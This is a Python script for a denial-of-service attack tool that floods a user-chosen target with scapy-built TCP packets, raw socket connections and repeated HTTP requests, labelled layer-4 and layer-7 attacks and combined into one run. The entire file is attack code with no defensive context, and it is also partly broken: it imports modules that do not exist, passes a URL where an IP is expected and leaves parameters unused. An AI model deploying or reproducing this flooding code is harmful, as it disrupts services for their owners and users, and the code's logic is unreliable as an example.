import sys
import time
import numpy as np
import threading
import requests
from queue import Queue
from threading import Thread
import socket
import random
from scapy.all import *
from plac import place
from python_sniffer.sniffer import Printer

class FloodException(Exception):
    """Base class for other exceptions."""
    pass

class Flood:
    def __init__(self, target, no_of_packets, file_out, prn, end, payload, payload_file, port, payload_size):
        self.target = target
        self.no_of_packets = no_of_packets
        self.file_out = file_out
        self.prn = prn
        self.end = end
        self.payload = payload
        self.port = port
        self.payload_size = payload_size

    def get_data(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.target, self.port))
            s.shutdown(2)
            data = s.recv(1024)
            return data
        except socket.error as msg:
            print("Error Code: " + str(msg) + " - On the target " + self.target)
            sys.exit(1)
        except FloodException as e:
            print("Error:", e)
            sys.exit(1)

    def send_data(self):
        f = open(self.file_out, 'wb')
        for idx in range(self.no_of_packets):
            if idx != 0 and idx % self.end == 0:
                f.flush()
            data = self.get_data()
            if self.payload:
                data = data.encode()
            f.write(data)
        f.flush()
        f.close()

    def fuzzer(self):
        try:
            for _ in range(self.no_of_packets):
                data = np.random.bytes(1024)
                src_port = random.randint(1025, 65535)

                ip_layer = IP(dst=self.target)
                tcp_layer = TCP(sport=src_port, dport=self.port)

                packet = ip_layer / tcp_layer / data

                if self.prn:
                    print(packet)
                else:
                    send(packet, verbose=0)

                self.end = np.random.randint(10000, 50000)
                if self.end == 0:
                    print(self.end)
        except FloodException as e:
            print("Error:", e)
            sys.exit(1)
        except socket.error as msg:
            print("Error Code: " + str(msg) + " - On the target " + self.target)
            sys.exit(1)
        print("Payload/Attack has stopped")

def get_user_input():
    try:
        target = input("Enter the target URL (including http(s)://): ")
        bot_amount = int(input("Enter the number of packets: "))
        attack_time = float(input("Enter the attack duration in seconds: "))
        threads = int(input("Enter the number of threads: "))
        port = int(input("Enter the target port: "))
        payload_string = input("Add payload to target (y or n): ")
        if payload_string == 'y':
            payload = True
            payload_file = input("Enter the path to the payload file: ")
            payload_size = int(input("Enter the size of the payload: "))
            return target, bot_amount, attack_time, threads, port, payload, payload_file, payload_size
        else:
            payload = False
            return target, bot_amount, attack_time, threads, port, payload, None, None
    except Exception as e:
        print("Error:", e)
        sys.exit(1)

def hulk_layer_4_attack(target, bot_amount, attack_time, threads, port):
    try:
        for _ in range(bot_amount):
            ip_layer = IP(dst=target)
            tcp_layer = TCP(sport=random.randint(1025, 65535), dport=port)
            data = 'Lorem Ipsum'  # Add payload (optional)
            send(ip_layer / tcp_layer / data, inter=0.0001, count=attack_time, verbose=False)
    except Exception as e:
        print("Error:", e)
        sys.exit(1)

def crash_layer_7_attack():
    target, bot_amount, attack_time, threads, port, payload, payload_file, payload_size = get_user_input()
    flood_instance = Flood(target, bot_amount, 'output.bin', False, 1000, payload, payload_file, port, payload_size)
    flood_instance.send_data()

def httpflood_layer_7_attack():
    target, bot_amount, attack_time, threads, port, payload, payload_file, payload_size = get_user_input()
    for _ in range(bot_amount):
        try:
            while attack_time > 0:
                requests.get(target)
                attack_time -= 0.001
        except Exception as e:
            print("Error:", e)
    print(f"\nTotal requests: {bot_amount}")

def combined_attack():
    target, bot_amount, attack_time, threads, port, payload, payload_file, payload_size = get_user_input()
    hulk_layer_4_attack(target, bot_amount, attack_time, threads, port)
    crash_layer_7_attack()
    httpflood_layer_7_attack()

def main():
    combined_attack()
    sys.exit(0)

if __name__ == '__main__':
    main()
